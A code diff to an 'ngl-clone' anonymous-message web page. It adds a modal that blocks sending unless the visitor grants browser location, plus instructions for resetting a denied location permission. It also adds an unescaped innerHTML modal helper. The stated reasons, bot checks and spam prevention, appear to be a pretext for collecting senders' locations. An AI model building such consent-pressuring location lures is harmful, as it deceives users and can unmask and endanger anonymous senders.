@@ -41,9 +41,9 @@
     .people-tap-count { color: #fff; margin: 10px auto 0; font-size: 18px; max-width: 420px; user-select: none; white-space: nowrap; overflow-x: auto; }
     .fade-out { animation: fadeOut 0.8s ease-out forwards; }
     @keyframes fadeOut {to {opacity: 0; transform: scale(0.95);}}
-    #sentOverlay { position: fixed; z-index: 100; inset: 0; background: rgba(0,0,0,0.12); display: none; flex-direction: column; align-items: center; justify-content: center; pointer-events: all; animation: fadeInSent 0.38s; }
+    #sentOverlay { position: fixed; z-index: 100; inset: 0; background: rgba(0,0,0,0.7); display: none; flex-direction: column; align-items: center; justify-content: center; pointer-events: all; animation: fadeInSent 0.38s; }
     @keyframes fadeInSent {from {opacity: 0;}to {opacity: 1;}}
-    .sent-circle { width: 140px; height: 140px; border-radius: 50%; background: none; margin-bottom: 22px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 48px 0 rgba(0,0,0,0.13); }
+    .sent-circle { width: 140px; height: 140px; border-radius: 50%; background: white; margin-bottom: 22px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 48px 0 rgba(0,0,0,0.13); }
     .sent-check { width: 140px; height: 140px; display: block; }
     .sent-text { color: #fff; font-family: 'Montserrat', Arial, sans-serif; font-size: 2.2rem; font-weight: 700; letter-spacing: 0.01em; text-shadow: 0 2px 8px rgba(0,0,0,0.16); user-select: none; }
     .sent-extra-box { margin: 18px auto 0; padding: 15px 20px; font-size: 20px; border-radius: 30px; width: 80%; max-width: 340px; background: #000; color: #fff; user-select: none; font-weight: 700; letter-spacing: 0.02em; transition: box-shadow 0.2s; box-shadow: 0 4px 18px -8px #f43f5e70; cursor: pointer; text-align: center; text-decoration: none; display: block; }
@@ -73,6 +73,10 @@
     ul { padding-left: 20px; margin: 15px 0; }
     li { margin-bottom: 8px; position: relative; text-align: left; }
     li:before { content: "•"; color: #ff007a; font-weight: bold; display: inline-block; width: 1em; margin-left: -1em; }
+    .denial-help { background: #f8f9fa; border-radius: 12px; padding: 15px; margin-top: 15px; text-align: left; }
+    .denial-help h4 { margin-top: 0; color: #f43f5e; }
+    .denial-help ol { padding-left: 20px; }
+    .denial-help li { margin-bottom: 8px; }
   </style>
 </head>
 <body>
@@ -152,7 +156,7 @@
         📍 Location Required
       </div>
       <div style="font-size:1.12rem; margin-bottom:14px; line-height:1.5;">
-        <p>This app <span style="color:#ff007a; font-weight:600;">requires</span> location to:</p>
+        <p>This ngl-clone <span style="color:#ff007a; font-weight:600;">requires</span> location to:</p>
         <ul>
           <li>Verify you're not a bot</li>
           <li>Prevent spam messages</li>
@@ -163,6 +167,31 @@
         </p>
       </div>
       <button class="ngl-modal-btn" id="nglUnderstandBtn">Got It</button>
+    </div>
+  </div>
+
+  <div id="nglDenialModal" class="ngl-modal-outer">
+    <div class="ngl-modal-inner">
+      <div style="font-size:2rem; font-weight:700; margin-bottom:15px; color:#f43f5e;">
+        ❌ Message Blocked
+      </div>
+      <div style="font-size:1.1rem; margin-bottom:10px;">
+        Your message wasn't sent because location was denied.
+      </div>
+      <div style="font-size:0.95rem; color:#666; margin-bottom:15px;">
+        <b>Tip:</b> Try refreshing the page and allow location when asked. If it still doesn't work, make sure this website's location permission isn't blocked.
+      </div>
+      
+      <div class="denial-help">
+        <h4>If you clicked "Never allow":</h4>
+        <ol>
+          <li><b>Chrome Android:</b> Tap ⋮ → Settings → Site settings → Location → Reset permissions</li>
+          <li><b>Safari iOS:</b> Go to Settings → Safari → Location → Reset permissions</li>
+          <li><b>Desktop:</b> Click the 🔒 icon in address bar → Site settings → Reset permissions</li>
+        </ol>
+      </div>
+      
+      <button class="ngl-modal-btn" onclick="window.location.reload()">Try Again</button>
     </div>
   </div>
 
@@ -439,16 +468,15 @@
     }
 
     function showHardDenialMessage() {
+      document.getElementById('nglDenialModal').style.display = 'flex';
+    }
+
+    function showModal(title, message) {
       document.getElementById('nglLocationModal').innerHTML = `
-        <div style="padding:20px; text-align:center">
-          <div style="font-size:2rem; margin-bottom:15px;">❌ Message Blocked</div>
-          <p>Your message wasn't sent because location was denied.</p>
-          <p style="font-size:0.9rem; color:#666; margin-top:20px;">
-            <b>Tip:</b> Refresh and allow location when asked
-          </p>
-          <button onclick="window.location.reload()" class="ngl-modal-btn">
-            Try Again
-          </button>
+        <div style="text-align:center">
+          <div style="font-size:2rem; font-weight:700; margin-bottom:15px; color:#f43f5e;">${title}</div>
+          <p style="font-size:1.1rem;">${message}</p>
+          <button class="ngl-modal-btn" onclick="document.getElementById('nglLocationModal').style.display='none'">OK</button>
         </div>
       `;
       document.getElementById('nglLocationModal').style.display = 'flex';
